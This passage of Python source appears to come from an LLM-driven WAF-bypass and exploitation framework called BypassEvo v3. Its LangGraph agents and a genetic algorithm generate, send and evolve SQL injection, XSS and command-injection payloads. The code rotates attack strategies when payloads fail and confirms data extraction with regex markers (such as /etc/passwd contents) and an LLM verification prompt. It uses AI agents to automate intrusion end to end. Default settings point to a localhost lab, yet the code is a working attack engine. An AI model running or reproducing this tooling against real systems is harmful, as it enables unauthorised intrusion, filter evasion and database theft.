                log.append("[EXPLOIT] All payloads tested -> GA evolve")
                return {"phase": "ga_exploit_evolve", "log": log, "iteration": iteration}

            payload_entry = payloads[idx]
            payload_str = payload_entry.get("payload", "")
            log.append(f"[EXPLOIT-EXEC] Testing #{idx + 1}: {payload_str}")

            extra = state.get("extra_params", {})
            result = executor.execute(
                payload=payload_str,
                endpoint=state.get("endpoint", "/"),
                param=state.get("param", "q"),
                method=state.get("method", "GET"),
                data=extra if extra else None,
            )

            # Increment iteration on each payload test
            iteration = iteration + 1

            # Connection error & 5xx tracking
            conn_errors = state.get("connection_errors", 0)
            server_errors = state.get("consecutive_server_errors", 0)
            resp_code = result.get("response_code", 0)
            evidence_text = result.get("evidence", "")
            is_conn_error = (
                resp_code == 0
                or "connection" in evidence_text.lower()
                or "max retries" in evidence_text.lower()
                or "timeout" in evidence_text.lower()
            )
            is_5xx = 500 <= resp_code < 600

            if is_conn_error:
                conn_errors += 1
                server_errors = 0
                log.append(f"[EXPLOIT-EXEC] Connection error ({conn_errors}/4): {evidence_text[:80]}")
                if conn_errors >= 4:
                    log.append("[SYSTEM] TARGET UNREACHABLE — 4 consecutive connection failures.")
                    log.append("[SYSTEM] Attack stopped. Check that target is running.")
                    return {
                        "phase": "done", "log": log,
                        "connection_errors": conn_errors, "iteration": iteration,
                        "stop_reason": "connection_errors",
                    }
            elif is_5xx:
                server_errors += 1
                conn_errors = 0
                err_hint = "502 Bad Gateway — target container may not be running" if resp_code == 502 else f"Server error {resp_code}"
                log.append(f"[EXPLOIT-EXEC] {err_hint} ({server_errors}/4)")
                if server_errors >= 4:
                    log.append(f"[SYSTEM] TARGET ERROR — 4 consecutive {resp_code} responses.")
                    if resp_code == 502:
                        log.append("[SYSTEM] Attack stopped. Check docker-compose is running.")
                    else:
                        log.append("[SYSTEM] Attack stopped. Server may be crashing or overloaded.")
                    return {
                        "phase": "done", "log": log,
                        "consecutive_server_errors": server_errors, "iteration": iteration,
                        "stop_reason": "server_errors",
                    }
            else:
                conn_errors = 0
                server_errors = 0

            ind = Individual(
                payload=payload_str,
                response_time=result.get("response_time", 0),
                response_code=result.get("response_code", 0),
                response_snippet=result.get("response_snippet", ""),
                indicators=result.get("indicators", []),
            )
            # Set baseline for content-shift scoring (boolean-blind detection)
            evaluator.baseline_content = state.get("baseline_snippet", "")
            fitness = evaluator.evaluate(ind, state.get("vuln_type", "sqli"))
            resp_preview = result.get("response_snippet", "")[:120].replace("\n", " ")
            indicators = result.get("indicators", [])
            evidence = result.get("evidence", "no evidence")
            resp_time = result.get("response_time", 0)
            resp_code = result.get("response_code", 0)

            # Classify strategy type from payload
            pl = payload_str.lower()
            if "updatexml" in pl or "extractvalue" in pl or "exp(" in pl or "floor" in pl:
                strategy_tag = "ERROR-BASED"
            elif "union" in pl:
                strategy_tag = "UNION"
            elif "sleep" in pl or "benchmark" in pl or "waitfor" in pl:
                strategy_tag = "TIME-BLIND"
            elif "and " in pl and ("ascii" in pl or "substring" in pl or "substr" in pl):
                strategy_tag = "BOOLEAN-BLIND"
            else:
                strategy_tag = "PROBE"

            # Track consecutive low fitness for strategy rotation + auto-pause
            consecutive_low = state.get("consecutive_low_fitness", 0)
            current_strategy = state.get("current_strategy", "error")

            if fitness < 0.4:
                consecutive_low += 1
                if consecutive_low >= 4:
                    # Force strategy rotation: error -> union -> blind -> time -> error
                    strategy_order = ["error", "union", "blind", "time"]
                    try:
                        next_idx = (strategy_order.index(current_strategy) + 1) % len(strategy_order)
                    except ValueError:
                        next_idx = 0
                    new_strategy = strategy_order[next_idx]
                    log.append(f"[EXPLOIT] STRATEGY ROTATION: {current_strategy.upper()} -> {new_strategy.upper()}")
                    log.append(f"[EXPLOIT] 4 consecutive low-fitness attempts detected. Forcing strategy switch.")
                    current_strategy = new_strategy
                    consecutive_low = 0
            else:
                consecutive_low = 0  # Reset on good fitness

            # Smart pause: 10 consecutive fitness < 0.3 → auto-pause
            very_low_streak = state.get("consecutive_very_low", 0)
            if fitness < 0.3:
                very_low_streak += 1
                if very_low_streak >= 10:
                    log.append("[SYSTEM] LOW FITNESS STALL — 10 consecutive attempts with fitness < 0.3.")
                    log.append("[SYSTEM] Auto-pausing to prevent wasted iterations.")
                    log.append("[SYSTEM] Suggestions: (1) Try manual payload testing, (2) Switch strategy, (3) Adjust target config.")
                    log.append("[SYSTEM] Click 'Resume' to continue the attack.")
                    return {
                        "phase": "paused", "log": log,
                        "consecutive_low_fitness": consecutive_low,
                        "consecutive_very_low": very_low_streak,
                        "current_strategy": current_strategy,
                        "iteration": iteration,
                        "paused": True,
                        "stop_reason": "low_fitness_stall",
                        "current_analysis": "PAUSED: 10 consecutive low-fitness attempts. Click Resume to continue or try manual testing.",
                    }
            else:
                very_low_streak = 0

            log.append(f"[EXPLOIT-EXEC] Strategy={strategy_tag} | #{idx + 1}")
            log.append(f"[EXPLOIT-EXEC] Payload: {payload_str}")
            log.append(f"[EXPLOIT-EXEC] Status={resp_code} | Time={resp_time:.2f}s | fitness={fitness:.3f}")
            if indicators:
                log.append(f"[EXPLOIT-EXEC] Indicators: {indicators}")
            log.append(f"[EXPLOIT-EXEC] Evidence: {evidence}")
            # Response preview with key indicators
            if resp_preview.strip():
                log.append(f"[EXPLOIT-EXEC] Response: {resp_preview[:200]}")
            # Show key error patterns detected
            kb = get_kb()
            kb_hits = kb.match(result.get("response_snippet", ""))
            if kb_hits:
                top_hits = [f"{desc} ({dbms})" for desc, _, dbms in kb_hits[:3]]
                log.append(f"[EXPLOIT-EXEC] Key Indicators: {', '.join(top_hits)}")

            memory.add(MemoryEntry(
                id=str(uuid.uuid4())[:8],
                payload=payload_str,
                vuln_type=state.get("vuln_type", "sqli"),
                result="success" if result["success"] else "failure",
                endpoint=state.get("endpoint", ""),
                evidence=result.get("evidence", ""),
                response_snippet=result.get("response_snippet", "")[:200],
                fitness=fitness,
                iteration=iteration,
                confidence=result.get("confidence", 0),
                metadata={"stage": "exploit", "bypass_technique": state.get("bypass_technique", "")},
            ))

            # Update memory stats for frontend
            memory_stats = {
                "total_entries": memory._stats.get("total", 0),
                "successes": memory._stats.get("successes", 0),
                "failures": memory._stats.get("failures", 0),
                "success_rate": memory._stats.get("successes", 0) / max(memory._stats.get("total", 1), 1),
                "session_id": memory.session_id,
                "chromadb": memory._use_chroma,
            }

            population = list(state.get("population", []))
            for p in population:
                if p.get("payload") == payload_str:
                    p["fitness"] = fitness
                    p["response_time"] = result.get("response_time", 0)
                    p["response_code"] = result.get("response_code", 0)
                    p["response_snippet"] = result.get("response_snippet", "")[:300]
                    p["indicators"] = result.get("indicators", [])
                    break

            # Seed ga_history with gen 0 if needed
            ga_history = list(state.get("ga_history", []))
            if population:
                fitnesses = [p.get("fitness", 0) for p in population]
                best_f = max(fitnesses) if fitnesses else 0
                needs_seed = not ga_history or (ga_history[0].get("best_fitness", 0) == 0 and best_f > 0)
                if needs_seed:
                    gen0_stats = {
                        "generation": 0,
                        "best_fitness": best_f,
                        "avg_fitness": sum(fitnesses) / max(len(fitnesses), 1),
                        "worst_fitness": min(fitnesses) if fitnesses else 0,
                        "best_payload": max(population, key=lambda x: x.get("fitness", 0)).get("payload", "") if population else "",
                        "population_size": len(population),
                    }
                    if ga_history and ga_history[0].get("generation") == 0:
                        ga_history[0] = gen0_stats
                    else:
                        ga_history.insert(0, gen0_stats)

            history = list(state.get("history", []))

            # Build current_analysis for frontend
            analysis_parts = [f"Strategy={strategy_tag}", f"Status={resp_code}", f"Time={resp_time:.2f}s", f"Fitness={fitness:.3f}"]
            if indicators:
                analysis_parts.append(f"Indicators={indicators}")
            if evidence and evidence != "no evidence":
                analysis_parts.append(f"Evidence={evidence[:100]}")
            if resp_preview.strip():
                analysis_parts.append(f"Response={resp_preview[:80]}")
            current_analysis = " | ".join(analysis_parts)

            if result["success"]:
                # ── Vuln-type-aware exploit success verification ──
                _vuln_type = state.get("vuln_type", "sqli")
                _response_text = result.get("response_snippet", "")
                _resp_lower = _response_text.lower()
                _is_true_exploit = False
                _extracted = ""

                if _vuln_type == "xss":
                    # ── XSS verification: check for reflected payload markers ──
                    _xss_markers = [
                        (r"<script[^>]*>.*?alert", "script tag with alert"),
                        (r"onerror\s*=", "onerror event handler"),
                        (r"onload\s*=", "onload event handler"),
                        (r"onclick\s*=", "onclick event handler"),
                        (r"onmouseover\s*=", "onmouseover handler"),
                        (r"onfocus\s*=", "onfocus event handler"),
                        (r"<svg[^>]+onload", "SVG onload"),
                        (r"<img[^>]+onerror", "IMG onerror"),
                        (r"javascript:", "javascript: URI"),
                        (r"<iframe[^>]+src", "iframe injection"),
                    ]
                    # Check if any XSS marker is present in the response
                    _matched_desc = ""
                    for _pattern, _desc in _xss_markers:
                        if re.search(_pattern, _response_text, re.IGNORECASE | re.DOTALL):
                            _matched_desc = _desc
                            break

                    if _matched_desc:
                        # Verify the payload fragment is actually reflected (not pre-existing)
                        _payload_fragment = payload_str[:20].lower()
                        if _payload_fragment in _resp_lower:
                            _is_true_exploit = True
                            _extracted = f"XSS reflected: {_matched_desc}"
                            log.append(f"[EXPLOIT-VERIFY] XSS confirmed — {_matched_desc}, payload reflected")
                        else:
                            log.append(f"[EXPLOIT-VERIFY] XSS marker found ({_matched_desc}) but payload not reflected")
                    else:
                        log.append("[EXPLOIT-VERIFY] XSS: no XSS markers found in response")

                elif _vuln_type == "cmdi":
                    # ── CMDi verification: check for command output patterns ──
                    _cmdi_markers = [
                        (r"uid=\d+\(\w+\)", "id command output"),
                        (r"root:.*:0:0:", "/etc/passwd content"),
                        (r"Linux\s+\S+\s+\d+\.\d+", "uname output"),
                        (r"total\s+\d+.*drwx", "ls -la output"),
                        (r"(?:\/usr\/bin|\/bin|\/sbin)\/", "path listing"),
                        (r"(?:www-data|apache|nginx|nobody)", "web user in output"),
                        (r"PING\s+\S+.*bytes of data", "ping output"),
                    ]
                    for _pattern, _desc in _cmdi_markers:
                        _match = re.search(_pattern, _response_text, re.IGNORECASE | re.DOTALL)
                        if _match:
                            _is_true_exploit = True
                            _extracted = f"CMDi output: {_match.group(0)[:100]}"
                            log.append(f"[EXPLOIT-VERIFY] CMDi confirmed — {_desc}: {_match.group(0)[:80]}")
                            break

                    # Time-based blind CMDi check (sleep/ping delay)
                    if not _is_true_exploit and result.get("response_time", 0) > 4.0:
                        _is_true_exploit = True
                        _extracted = f"Time-based CMDi: {result.get('response_time', 0):.1f}s delay"
                        log.append(f"[EXPLOIT-VERIFY] CMDi confirmed — time-based: {result.get('response_time', 0):.1f}s")

                    if not _is_true_exploit:
                        log.append("[EXPLOIT-VERIFY] CMDi: no command output patterns or time delay detected")

                else:
                    # ── SQLi verification (default): LLM-based analysis ──
                    # Smart truncation: find the SQL error section, not just first 1500 chars
                    _relevant_section = ""
                    _error_markers = ["xpath syntax error", "you have an error", "duplicate entry",
                                      "extractvalue", "updatexml", "mysql", "syntax error",
                                      "0x7e", "~", "group_concat", "@@version", "database()"]
                    for _marker in _error_markers:
                        _pos = _resp_lower.find(_marker)
                        if _pos > 0:
                            _start = max(0, _pos - 100)
                            _end = min(len(_response_text), _pos + 400)
                            _relevant_section = _response_text[_start:_end]
                            break
                    if not _relevant_section:
                        _relevant_section = _response_text[:1500]

                    if llm and _relevant_section.strip():
                        try:
                            _verify_prompt = (
                                "You are a SQL injection exploit verification engine. "
                                "Analyze the HTTP response below and determine if REAL DATA was extracted from the database, "
                                "or if the response only shows a SQL SYNTAX ERROR (which just confirms the injection point exists but extracts nothing).\n\n"
                                "CRITICAL DISTINCTION:\n"
                                "- SYNTAX ERROR (NOT success): 'You have an error in your SQL syntax... near UPDATE/**/XML(1,CONCAT(0x7e,...' "
                                "— This is MySQL echoing back the failed query. No data was extracted.\n"
                                "- DATA EXTRACTION (SUCCESS): 'XPATH syntax error: ~5.7.33-0ubuntu~' "
                                "— This shows actual database data (version 5.7.33) between the ~ delimiters.\n"
                                "- DATA EXTRACTION (SUCCESS): 'First name: admin Surname: password' "
                                "— This shows actual table data being returned.\n\n"
                                "RULES:\n"
                                "- If the response just echoes the payload in an error message → NOT success\n"
                                "- If you see actual database values (version numbers, table names, user data) → SUCCESS\n"
                                "- If you see 'XPATH syntax error' with data between delimiters → SUCCESS\n"
                                "- If you see 'duplicate entry' with data → SUCCESS\n"
                                "- A generic 'syntax error' or 'mysql_fetch' error alone is NOT data extraction\n\n"
                                f"PAYLOAD SENT: {payload_str}\n\n"
                                f"RELEVANT RESPONSE SECTION:\n{_relevant_section}\n\n"
                                "Respond with JSON:\n"
                                '{"is_data_extracted": true/false, "extracted_data": "what was extracted or empty string", '
                                '"reasoning": "why you made this determination"}'
                            )
                            _verify_result = llm.generate_json(
                                "You are a precise SQL injection result analyzer. Only output JSON.",
                                _verify_prompt,
                            )
                            if isinstance(_verify_result, dict) and not _verify_result.get("parse_error"):
                                _is_true_exploit = _verify_result.get("is_data_extracted", False)
                                _extracted = _verify_result.get("extracted_data", "")
                                _reasoning = _verify_result.get("reasoning", "")
                                if _is_true_exploit:
                                    log.append(f"[EXPLOIT-VERIFY] LLM confirmed data extraction: {_extracted[:100]}")
                                else:
                                    log.append(f"[EXPLOIT-VERIFY] LLM says NO data extracted: {_reasoning[:100]}")
                            else:
                                # LLM parse failed — fall back to conservative heuristic
                                log.append("[EXPLOIT-VERIFY] LLM verification failed — using conservative check")
                                _is_true_exploit = False
                        except Exception as e:
                            log.append(f"[EXPLOIT-VERIFY] LLM call failed: {e} — using conservative check")
                            _is_true_exploit = False
                    else:
                        # No LLM available — use conservative heuristic (only time-based and union_data indicators)
                        _indicators = result.get("indicators", []) or []
                        _is_true_exploit = any(
                            ind in str(_indicators) for ind in ["union_data", "db_metadata", "time_delay_heavy"]
                        )

                if _is_true_exploit:
                    # True data extraction confirmed — mark as exploit success
                    # Bug Fix 2: Reset strategy rotation counter on success
                    consecutive_low = 0
                    log.append(f"[EXPLOIT] >>> VULNERABILITY CONFIRMED <<< [{strategy_tag}]")
                    log.append(f"[EXPLOIT] Evidence: {result['evidence']}")
                    log.append(f"[EXPLOIT] Payload: {payload_str}")
                    history.append({
                        "payload": payload_str, "result": "success",
                        "evidence": result["evidence"], "fitness": fitness,
                        "iteration": iteration,
                        "bypass_technique": state.get("bypass_technique", ""),
                    })
                    _extracted_display = _extracted or ""
                    return {
                        "execution_result": result, "success": True, "phase": "done",
                        "history": history, "population": population, "ga_history": ga_history,
                        "log": log,
                        "consecutive_low_fitness": 0,
                        "consecutive_very_low": 0,
                        "consecutive_server_errors": 0,
                        "current_strategy": current_strategy,
                        "iteration": iteration,
                        "current_analysis": f"SUCCESS! Data: {_extracted_display}" if _extracted_display else "SUCCESS! Vulnerability confirmed",
                        "extracted_data": _extracted_display,
                        "memory_stats": memory_stats,
                    }
                else:
                    # SQL error detected but NO data extraction — injection confirmed,
                    # but payload needs refinement to actually extract data.
                    # Treat as high-fitness signal, NOT final success.
                    log.append(f"[EXPLOIT-EXEC] SQL error detected but no data extraction [{strategy_tag}]")
                    log.append(f"[EXPLOIT-EXEC] Injection point CONFIRMED — refining payload for data extraction...")
                    log.append(f"[EXPLOIT-EXEC] Evidence (non-extractive): {evidence[:120]}")
                    # Boost fitness to signal progress but don't flatten all to same value
                    # Use original fitness + bonus (preserves differentiation for GA)
                    fitness = max(fitness, min(fitness + 0.2, 0.7))
                    # Write boosted fitness back to population so GA prioritizes this payload
                    for p in population:
                        if p.get("payload") == payload_str:
                            p["fitness"] = fitness
                            break
                    # Reset low-fitness counter since we have a strong signal
                    consecutive_low = 0

            # Log why this attempt failed
            if fitness < 0.2:
                log.append(f"[EXPLOIT-EXEC] Low fitness ({fitness:.3f}): no injection signal detected")
            elif fitness < 0.5:
                log.append(f"[EXPLOIT-EXEC] Partial signal (fitness={fitness:.3f}): possible weak injection")

            history.append({
                "payload": payload_str, "result": "failure",
                "evidence": result.get("evidence", ""), "fitness": fitness,
                "indicators": result.get("indicators", []),
                "iteration": iteration,
            })

            next_idx = idx + 1
            if next_idx < len(payloads):
                return {
                    "execution_result": result, "payload_index": next_idx,
                    "history": history, "population": population, "ga_history": ga_history,
                    "log": log,
                    "consecutive_low_fitness": consecutive_low,
                    "consecutive_very_low": very_low_streak,
                    "consecutive_server_errors": server_errors,
                    "current_strategy": current_strategy,
                    "iteration": iteration,
                    "current_analysis": current_analysis,
                    "memory_stats": memory_stats,
                }
            else:
                return {
                    "execution_result": result, "phase": "ga_exploit_evolve",
                    "history": history, "population": population, "ga_history": ga_history,
                    "log": log,
                    "consecutive_low_fitness": consecutive_low,
                    "consecutive_very_low": very_low_streak,
                    "consecutive_server_errors": server_errors,
                    "current_strategy": current_strategy,
                    "iteration": iteration,
                    "current_analysis": current_analysis,
                    "memory_stats": memory_stats,
                }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] exploit_execute failed: {e}\n{traceback.format_exc()[-200:]}")
            return {"phase": "ga_exploit_evolve", "log": log, "iteration": state.get("iteration", 0) + 1}
    return exploit_execute


def make_ga_exploit_evolve_node(mutator: MutatorAgent, memory: AttackMemory):
    """Evolve population for exploit effectiveness."""
    def ga_exploit_evolve(state: AttackState) -> dict:
        try:
            log = list(state.get("log", []))
            iteration = state.get("iteration", 0)
            max_iter = state.get("max_iterations", 20)
            ga_gen = state.get("ga_generation", 0)
            population_data = state.get("population", [])

            if iteration >= max_iter:
                log.append(f"[GA-EXPLOIT] Max iterations ({max_iter}) reached.")
                memory.persist()
                return {"phase": "done", "log": log}

            population = [_deserialize_individual(d) for d in population_data]

            if not mutator.ga_engine:
                seed_payloads = [{"payload": ind.payload, "family": ind.family} for ind in population]
                mutator.initialize_ga(seed_payloads, state.get("vuln_type", "sqli"))
                mutator.ga_engine.generation = ga_gen

            new_population = mutator.ga_engine.evolve(population)
            stats = mutator.ga_engine.get_stats()

            log.append(f"[GA-EXPLOIT] Gen {stats['generation']}: best={stats['best_fitness']:.3f} avg={stats['avg_fitness']:.3f}")
            if stats.get("best_payload"):
                log.append(f"[GA-EXPLOIT] Best: {stats['best_payload'][:60]}")

            tree = dict(state.get("evolution_tree", {}))
            tree.update(mutator.ga_engine.evolution_tree)

            new_pop_data = [_serialize_individual(ind) for ind in new_population]

            # Seed ga_history with generation 0 if this is the first evolution
            ga_history = list(state.get("ga_history", []))
            if not ga_history and population:
                fitnesses = [p.fitness for p in population]
                gen0_stats = {
                    "generation": 0,
                    "best_fitness": max(fitnesses) if fitnesses else 0,
                    "avg_fitness": sum(fitnesses) / max(len(fitnesses), 1),
                    "worst_fitness": min(fitnesses) if fitnesses else 0,
                    "best_payload": max(population, key=lambda x: x.fitness).payload if population else "",
                    "population_size": len(population),
                }
                ga_history.append(gen0_stats)
            ga_history.append(stats)

            return {
                "population": new_pop_data,
                "ga_generation": ga_gen + 1,
                "ga_stats": stats,
                "ga_history": ga_history,
                "iteration": iteration,
                "phase": "exploit_generate",
                "evolution_tree": tree,
                "log": log,
            }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] ga_exploit_evolve failed: {e}\n{traceback.format_exc()[-200:]}")
            return {"phase": "exploit_generate", "log": log}
    return ga_exploit_evolve


# ── Routing ────────────────────────────────────────────────────────────


def route_after_bypass(state: AttackState) -> Literal["done", "bypass_execute", "exploit_generate", "ga_bypass_evolve", "block_analyze"]:
    """Routing after bypass_execute node."""
    if state.get("success"):
        return "done"
    # Check if attack should stop (max iterations, server errors, etc.)
    if state.get("phase") == "done" or state.get("stop_reason"):
        return "done"
    if state.get("bypass_success"):
        return "exploit_generate"
    payloads = state.get("current_payloads", [])
    idx = state.get("payload_index", 0)
    if idx < len(payloads):
        return "bypass_execute"
    # Check phase set by bypass_execute (fast mode may skip block_analyze)
    phase = state.get("phase", "")
    if phase == "ga_bypass_evolve":
        return "ga_bypass_evolve"
    return "block_analyze"


def route_after_exploit(state: AttackState) -> Literal["done", "exploit_execute", "ga_exploit_evolve"]:
    """Routing after exploit_execute node."""
    if state.get("success"):
        return "done"
    # Check if attack should stop (max iterations, server errors, paused, etc.)
    if state.get("phase") == "done" or state.get("stop_reason") or state.get("paused"):
        return "done"
    payloads = state.get("current_payloads", [])
    idx = state.get("payload_index", 0)
    if idx < len(payloads):
        return "exploit_execute"
    return "ga_exploit_evolve"


# ── Graph construction ─────────────────────────────────────────────────


def build_graph(config: BypassEvoConfig) -> StateGraph:
    """Build the BypassEvo v3 two-stage LangGraph state machine."""
    llm = LLMClient(config.llm)
    rl = config.rate_limit
    fast = config.fast_test

    # Apply Fast Test Mode overrides to rate limits
    if fast.enabled:
        bypass_rl_cfg = config.bypass_rate_limit or RateLimitConfig(
            request_delay=fast.bypass_delay,
            delay_jitter=rl.delay_jitter * 0.5,
            backoff_on_429=rl.backoff_on_429,
            backoff_on_block=rl.backoff_on_block,
            max_consecutive_blocks=rl.max_consecutive_blocks,
            block_pause=rl.block_pause,
            verify_bypass_attempts=fast.quick_verify_count,
            backoff_multiplier=rl.backoff_multiplier,
            max_backoff=rl.max_backoff,
            jitter_distribution=rl.jitter_distribution,
        )
        exploit_rl_cfg = config.exploit_rate_limit or RateLimitConfig(
            request_delay=fast.exploit_delay,
            delay_jitter=rl.delay_jitter * 0.5,
            backoff_on_429=rl.backoff_on_429,
            backoff_on_block=rl.backoff_on_block,
            max_consecutive_blocks=rl.max_consecutive_blocks,
            block_pause=rl.block_pause,
            verify_bypass_attempts=fast.quick_verify_count,
            backoff_multiplier=rl.backoff_multiplier,
            max_backoff=rl.max_backoff,
            jitter_distribution=rl.jitter_distribution,
        )
    else:
        bypass_rl_cfg = config.bypass_rate_limit or config.rate_limit
        exploit_rl_cfg = config.exploit_rate_limit or config.rate_limit

    scanner = Scanner(
        config.target.base_url,
        config.target.timeout,
        php_sessid=config.target.php_sessid,
        request_delay=bypass_rl_cfg.request_delay if fast.enabled else rl.request_delay,
        delay_jitter=bypass_rl_cfg.delay_jitter if fast.enabled else rl.delay_jitter,
        backoff_on_429=rl.backoff_on_429,
        backoff_on_block=rl.backoff_on_block,
        max_consecutive_blocks=rl.max_consecutive_blocks,
        block_pause=rl.block_pause,
        backoff_multiplier=rl.backoff_multiplier,
        max_backoff=rl.max_backoff,
        jitter_distribution=rl.jitter_distribution,
    )
    bypass_rl = bypass_rl_cfg
    exploit_rl = exploit_rl_cfg
    memory = AttackMemory(
        persist_dir=config.memory.persist_dir,
        session_id=f"bypassevo_{uuid.uuid4().hex[:6]}",
    ) if config.memory.enabled else _NoOpMemory()

    orchestrator = OrchestratorAgent(llm, memory)
    generator = GeneratorAgent(llm, memory)
    executor = ExecutorAgent(scanner)
    reflector = ReflectorAgent(llm)
    mutator = MutatorAgent(llm, config.ga)
    evaluator = FitnessEvaluator()

    analyzer = WAFBlockAnalyzer(scanner, llm, timeout=config.target.timeout)
    searcher = WAFBypassSearcher(config.web_search) if config.web_search.enabled else None
    browser = BrowserAnalyzer(timeout=config.target.timeout)

    graph = StateGraph(AttackState)

    # ── Stage switch helpers ──────────────────────────────────────────
    def switch_to_bypass(state: AttackState) -> dict:
        scanner.set_rate_limit(bypass_rl)
        return {"rate_limit_status": scanner.get_rate_limit_status()}

    def switch_to_exploit(state: AttackState) -> dict:
        scanner.set_rate_limit(exploit_rl)
        return {"rate_limit_status": scanner.get_rate_limit_status()}

    def update_rl_status(state: AttackState) -> dict:
        return {"rate_limit_status": scanner.get_rate_limit_status()}

    # ── Shared nodes ─────────────────────────────────────────────────
    graph.add_node("recon", make_recon_node(scanner, config.proxy, memory, fast_mode=fast.enabled))
    graph.add_node("waf_detect", make_waf_detect_node(config.target.base_url, config.target.timeout, config.target.php_sessid))
    graph.add_node("switch_to_bypass", switch_to_bypass)
    graph.add_node("switch_to_exploit", switch_to_exploit)
    graph.add_node("update_rl_status", update_rl_status)

    # ── Stage 1: Bypass nodes ────────────────────────────────────────
    graph.add_node("bypass_generate", make_bypass_generate_node(generator, llm, memory, searcher, scanner))
    graph.add_node("bypass_execute", make_bypass_execute_node(executor, analyzer, memory, evaluator, llm, config, scanner, fast_mode=fast.enabled, reflector=reflector))
    graph.add_node("block_analyze", make_block_analyze_node(analyzer, llm, fast_mode=fast.enabled, browser_analyzer=browser, memory=memory))
    graph.add_node("hypothesis_refine", make_hypothesis_refine_node(llm, memory))
    graph.add_node("ga_bypass_evolve", make_ga_bypass_evolve_node(mutator, memory))

    # ── Stage 2: Exploit nodes ───────────────────────────────────────
    graph.add_node("exploit_generate", make_exploit_generate_node(generator, llm))
    graph.add_node("exploit_execute", make_exploit_execute_node(executor, memory, evaluator, llm))
    graph.add_node("ga_exploit_evolve", make_ga_exploit_evolve_node(mutator, memory))

    # ── Entry ────────────────────────────────────────────────────────
    graph.set_entry_point("recon")

    # ── Edges ────────────────────────────────────────────────────────
    graph.add_edge("recon", "waf_detect")

    graph.add_conditional_edges(
        "waf_detect",
        lambda s: "switch_to_bypass" if s.get("stage") == "bypass" else "switch_to_exploit",
        {"switch_to_bypass": "switch_to_bypass", "switch_to_exploit": "switch_to_exploit"},
    )
    graph.add_edge("switch_to_bypass", "bypass_generate")
    graph.add_edge("switch_to_exploit", "exploit_generate")

    graph.add_edge("bypass_generate", "bypass_execute")
    graph.add_edge("block_analyze", "hypothesis_refine")
    graph.add_edge("hypothesis_refine", "ga_bypass_evolve")
    graph.add_edge("ga_bypass_evolve", "bypass_generate")

    graph.add_conditional_edges(
        "bypass_execute",
        route_after_bypass,
        {
            "done": END,
            "bypass_execute": "update_rl_status",
            "exploit_generate": "switch_to_exploit",
            "block_analyze": "block_analyze",
            "ga_bypass_evolve": "ga_bypass_evolve",
        },
    )
    graph.add_edge("update_rl_status", "bypass_execute")

    graph.add_edge("exploit_generate", "exploit_execute")
    graph.add_edge("ga_exploit_evolve", "exploit_generate")

    graph.add_conditional_edges(
        "exploit_execute",
        route_after_exploit,
        {
            "done": END,
            "exploit_execute": "update_rl_status_exploit",
            "ga_exploit_evolve": "ga_exploit_evolve",
        },
    )
    graph.add_node("update_rl_status_exploit", lambda s: {"rate_limit_status": scanner.get_rate_limit_status()})
    graph.add_edge("update_rl_status_exploit", "exploit_execute")

    return graph.compile()


def create_initial_state(
    target_url: str = "http://localhost:5000",
    endpoint: str = "/search",
    param: str = "q",
    method: str = "GET",
    vuln_type: str = "sqli",
    max_iterations: int = 20,
    extra_params: dict = None,
) -> AttackState:
    return AttackState(
        stage="bypass",
        block_analysis={},
        bypass_success=False,
        bypass_payload="",
        bypass_technique="",
        bypass_techniques=[],
        bypass_history=[],
        block_history=[],
        phase="idle",
        vuln_type=vuln_type,
        target_url=target_url,
        endpoint=endpoint,
        param=param,
        method=method,
        targets=[],
        active_target_idx=0,
        target_results=[],
        recon_data={},
        proxy_history=[],
        waf_result={},
        population=[],
        ga_generation=0,
        ga_stats={"generation": 0, "best_fitness": 0, "avg_fitness": 0, "worst_fitness": 0, "mutation_rate": 0, "population_size": 0},
        ga_history=[{"generation": 0, "best_fitness": 0, "avg_fitness": 0, "worst_fitness": 0, "best_payload": "", "population_size": 0}],
        current_payloads=[],
        current_payload="",
        payload_index=0,
        execution_result={},
        success=False,
        reflection={},
        iteration=0,
        max_iterations=max_iterations,
        history=[],
        evolution_tree={},
        memory_stats={},
        log=["[SYSTEM] BypassEvo v3.0 — AI-Driven WAF Bypass Research & Exploit Framework"],
        report="",
        rate_limit_status={},
        extra_params=extra_params or {},
        injection_fingerprint={"is_injectable": False, "quote_type": "unknown", "closure_char": "", "comment_style": "--", "dbms_hint": "unknown", "confidence": 0.0},
        connection_errors=0,
        consecutive_server_errors=0,
        consecutive_very_low=0,
        stop_reason="",
        paused=False,
        consecutive_low_fitness=0,
        current_strategy="error",
        extracted_data="",
        recon_report="",
        current_analysis="",
        recommended_strategy="unknown",
        blocked_payload_count=0,
        web_search_results="",
        strategy_plan=None,
        hypotheses=[],
        hypothesis_history=[],
        inferred_rules=[],
        reasoning_chain={},
    )
